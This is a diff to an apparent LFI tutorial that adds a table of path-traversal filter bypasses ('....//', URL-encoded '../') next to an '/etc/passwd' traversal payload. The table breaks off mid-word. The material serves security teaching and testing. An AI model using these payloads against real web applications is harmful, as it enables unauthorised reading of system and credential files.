@@ -49,4 +49,11 @@ In the above case, the payload required is /../../../../../../../../../etc/passw
 
 Basic LFI Bypass:
 
-Below is 
+Below is a list of payload that we can combine / use to bypass different LFI Protections
+
+
+| Payload   | Alternative        | Description                 | Usage                                              |
+| --------- | ------------------ | --------------------------- | -------------------------------------------------- |
+| ....//    | ..././ or `....\/` | Replace all ../ with ....// | Bypass filter that does not recursively remove ../ |
+| %2e%2e%2f | -                  | URL Encoding of ../         | Bypass Filt                                        |
+|           |                    |                             |                                                    |
